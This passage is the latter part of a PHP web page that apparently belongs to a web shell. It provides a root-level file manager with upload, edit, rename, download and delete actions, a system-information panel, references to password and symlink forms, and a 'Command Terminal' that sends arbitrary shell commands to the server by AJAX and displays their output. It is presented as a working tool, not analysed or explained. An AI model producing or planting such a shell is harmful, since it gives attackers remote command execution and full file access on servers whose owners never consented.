        <div class="info-content" id="infoContent">
            <div style="text-align: center;">
                <span class="loader"></span> Loading system information...
            </div>
        </div>
        <div style="text-align: right; margin-top: 15px;">
            <button class="btn" onclick="closeInfoModal()">Close</button>
            <button class="btn" onclick="refreshInfo()">Refresh</button>
        </div>
    </div>
</div>

<!-- MODAL CMD -->
<div id="cmdModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="modal-title">
                <i class="fas fa-terminal"></i> Command Terminal
            </div>
            <span class="modal-close" onclick="closeCmdModal()">&times;</span>
        </div>
        <div class="cmd-container">
            <div class="cmd-input-group">
                <input type="text" id="cmdInput" placeholder="Enter command (ls, pwd, id, etc)" onkeypress="if(event.key==='Enter') executeCommand()">
                <button onclick="executeCommand()"><i class="fas fa-play"></i> Run</button>
                <button onclick="clearOutput()" style="background:#333;"><i class="fas fa-eraser"></i></button>
            </div>
            <div class="cmd-prompt">
                <i class="fas fa-folder"></i> Current: <span id="currentDir"><?=htmlspecialchars($current_dir)?></span>
            </div>
            <div id="cmdOutput" class="cmd-output">
                <span style="color:#00aaaa;">[ Type a command and press Enter ]</span>
            </div>
        </div>
    </div>
</div>

<!-- FLOATING CMD BUTTON -->
<div class="floating-cmd">
    <button onclick="openCmdModal()" title="Open Terminal (Ctrl+`)">
        <i class="fas fa-terminal"></i>
    </button>
</div>

<!-- RENAME FORM -->
<?php if(isset($rename_mode)): ?>
<div class="password-form" style="max-width:400px;">
    <div class="password-title">Rename: <?=htmlspecialchars($rename_file)?></div>
    <form method="post">
        <div class="form-row">
            <input type="text" name="new_name" value="<?=htmlspecialchars($rename_file)?>" required>
        </div>
        <div class="form-row" style="justify-content: center;">
            <button type="submit" class="btn">Rename</button>
            <a href="?dir=<?=urlencode($dir)?>" class="btn">Cancel</a>
        </div>
    </form>
</div>
<?php endif; ?>

<div class="container">
    <!-- PATH BAR -->
    <div class="path-bar">
        <span class="path-links">
            <a href="?"><i class="fas fa-home"></i> /</a>
            <?php
            $parts = explode('/', trim($current_dir, '/'));
            $path_current = '';
            foreach($parts as $p){
                if($p == '') continue;
                $path_current .= '/'.$p;
                echo ' <a href="?dir='.urlencode($path_current).'"><i class="fas fa-folder"></i> '.$p.'</a>/';
            }
            ?>
        </span>
    </div>

    <!-- FILE OPERATIONS -->
    <div class="form-section">
        <div class="section-title"><i class="fas fa-file"></i> File Operations</div>
        
        <!-- Upload Form -->
        <form method="post" enctype="multipart/form-data" class="form-row">
            <input type="file" name="upfile" required>
            <button type="submit"><i class="fas fa-upload"></i> Upload</button>
        </form>
        
        <!-- Create Folder/File -->
        <form method="post" class="form-row">
            <input type="text" name="newfolder" placeholder="New folder name">
            <button type="submit"><i class="fas fa-folder-plus"></i> Create Folder</button>
            <input type="text" name="newfile" placeholder="New file name">
            <button type="submit"><i class="fas fa-file"></i> Create File</button>
        </form>
    </div>

    <!-- EDITOR -->
    <?php if(isset($edit_mode)): ?>
    <div class="editor-container">
        <div class="section-title">Editing: <?=htmlspecialchars($_GET['edit'])?></div>
        <form method="post">
            <input type="hidden" name="fname" value="<?=htmlspecialchars($_GET['edit'])?>">
            <textarea name="content" class="editor-textarea"><?=htmlspecialchars($edit_content)?></textarea>
            <div class="form-row">
                <button type="submit" name="save" class="btn">Save</button>
                <a href="?dir=<?=urlencode($dir)?>" class="btn">Cancel</a>
            </div>
        </form>
    </div>
    <?php else: ?>

    <!-- FILE LIST -->
    <div class="form-section">
        <div class="section-title"><i class="fas fa-list"></i> File Manager</div>
        <table class="file-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if($current_dir != '/'): ?>
                <tr>
                    <td class="file-name"><a href="?dir=<?=urlencode(dirname($current_dir))?>"><i class="fas fa-level-up-alt"></i> ../</a></td>
                    <td>-</td>
                    <td>-</td>
                </tr>
                <?php endif; ?>
                
                <?php
                $files = @scandir($current_dir);
                if($files):
                    foreach($files as $f):
                        if($f == '.' || $f == '..') continue;
                        $full = $current_dir.'/'.$f;
                        $is_dir = is_dir($full);
                        $size = $is_dir ? '-' : number_format(filesize($full)).' B';
                ?>
                <tr>
                    <td class="file-name">
                        <?php if($is_dir): ?>
                            <a href="?dir=<?=urlencode($full)?>"><i class="fas fa-folder"></i> <?=htmlspecialchars($f)?>/</a>
                        <?php else: ?>
                            <i class="fas fa-file"></i> <?=htmlspecialchars($f)?>
                        <?php endif; ?>
                    </td>
                    <td><?=$size?></td>
                    <td class="file-actions">
                        <?php if($is_dir): ?>
                            <a href="?dir=<?=urlencode($full)?>" title="Open"><i class="fas fa-folder-open"></i></a>
                            <a href="?dir=<?=urlencode($current_dir)?>&rename=<?=urlencode($f)?>" title="Rename"><i class="fas fa-edit"></i></a>
                            <a href="?dir=<?=urlencode($current_dir)?>&del=<?=urlencode($f)?>" onclick="return confirm('Delete <?=$f?>?')" title="Delete"><i class="fas fa-trash"></i></a>
                        <?php else: ?>
                            <a href="?dir=<?=urlencode($current_dir)?>&edit=<?=urlencode($f)?>" title="Edit"><i class="fas fa-pen"></i></a>
                            <a href="?dir=<?=urlencode($current_dir)?>&rename=<?=urlencode($f)?>" title="Rename"><i class="fas fa-edit"></i></a>
                            <a href="?dir=<?=urlencode($current_dir)?>&down=<?=urlencode($f)?>" title="Download"><i class="fas fa-download"></i></a>
                            <a href="?dir=<?=urlencode($current_dir)?>&del=<?=urlencode($f)?>" onclick="return confirm('Delete <?=$f?>?')" title="Delete"><i class="fas fa-trash"></i></a>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; endif; ?>
            </tbody>
        </table>
    </div>
    <?php endif; ?>
</div>

<script>
// Modal functions
function openCmdModal() {
    document.getElementById('cmdModal').style.display = 'block';
    document.getElementById('cmdInput').focus();
}

function closeCmdModal() {
    document.getElementById('cmdModal').style.display = 'none';
}

function showPasswordForm() {
    document.getElementById('passwordForm').style.display = 'block';
}

function hidePasswordForm() {
    document.getElementById('passwordForm').style.display = 'none';
}

function showSymlinkForm() {
    document.getElementById('symlinkForm').style.display = 'block';
}

function hideSymlinkForm() {
    document.getElementById('symlinkForm').style.display = 'none';
}

// Info Modal Functions
function showInfoModal() {
    document.getElementById('infoModal').style.display = 'block';
    loadSystemInfo();
}

function closeInfoModal() {
    document.getElementById('infoModal').style.display = 'none';
}

function loadSystemInfo() {
    var infoContent = document.getElementById('infoContent');
    infoContent.innerHTML = '<div style="text-align: center;"><span class="loader"></span> Loading system information...</div>';
    
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '?ajax_info=1', true);
    xhr.onload = function() {
        if (xhr.status === 200) {
            infoContent.innerHTML = '<pre style="margin:0; color:#0f0; font-family: Consolas, monospace;">' + escapeHtml(xhr.responseText) + '</pre>';
        } else {
            infoContent.innerHTML = '<div style="color:#f00;">Error loading system information</div>';
        }
    };
    xhr.send();
}

function refreshInfo() {
    loadSystemInfo();
}

function clearOutput() {
    document.getElementById('cmdOutput').innerHTML = '<span style="color:#00aaaa;">[ Output cleared ]</span>';
}

function executeCommand() {
    var cmd = document.getElementById('cmdInput').value.trim();
    if (cmd === '') return;
    
    var outputDiv = document.getElementById('cmdOutput');
    var currentDir = document.getElementById('currentDir').innerText;
    
    // Add command to output
    outputDiv.innerHTML += '<div style="color:#00ff00; margin-top:10px;"><span style="color:#00aaaa;">$ ' + currentDir + '</span> <span style="color:#ffff00;">' + escapeHtml(cmd) + '</span></div>';
    
    // Show loading
    outputDiv.innerHTML += '<div id="cmdLoading" style="color:#00aaaa;"><span class="loader"></span> Executing...</div>';
    
    // Scroll to bottom
    outputDiv.scrollTop = outputDiv.scrollHeight;
    
    // Clear input
    document.getElementById('cmdInput').value = '';
    
    // Send AJAX request
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        // Remove loading
        var loading = document.getElementById('cmdLoading');
        if (loading) loading.remove();
        
        if (xhr.status === 200) {
            var response = xhr.responseText;
            
            // Check if directory changed
            if (response.startsWith('DIR_CHANGED:')) {
                var newDir = response.substring(12);
                document.getElementById('currentDir').innerText = newDir;
                outputDiv.innerHTML += '<div style="color:#00ff00;">✓ Directory changed to: ' + escapeHtml(newDir) + '</div>';
            } else {
                outputDiv.innerHTML += '<div style="color:#0f0;">' + escapeHtml(response) + '</div>';
            }
        } else {
            outputDiv.innerHTML += '<div style="color:#ff0000;">✗ Error: ' + xhr.status + '</div>';
        }
        
        // Scroll to bottom
        outputDiv.scrollTop = outputDiv.scrollHeight;
    };
    
    xhr.send('ajax_cmd=' + encodeURIComponent(cmd));
}

// Helper function to escape HTML
function escapeHtml(text) {
    var div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Close modal when clicking outside
window.onclick = function(event) {
    var cmdModal = document.getElementById('cmdModal');
    var infoModal = document.getElementById('infoModal');
    
    if (event.target == cmdModal) {
        cmdModal.style.display = 'none';
    }
    if (event.target == infoModal) {
        infoModal.style.display = 'none';
    }
}

// Keyboard shortcut: Ctrl+` to open terminal
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.key === '`') {
        e.preventDefault();
        openCmdModal();
    }
});

// Auto hide messages
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
        var messages = document.querySelectorAll('.msg-error, .msg-success');
        messages.forEach(function(msg) {
            msg.style.display = 'none';
        });
    }, 5000);
});
</script>
</body>
</html>
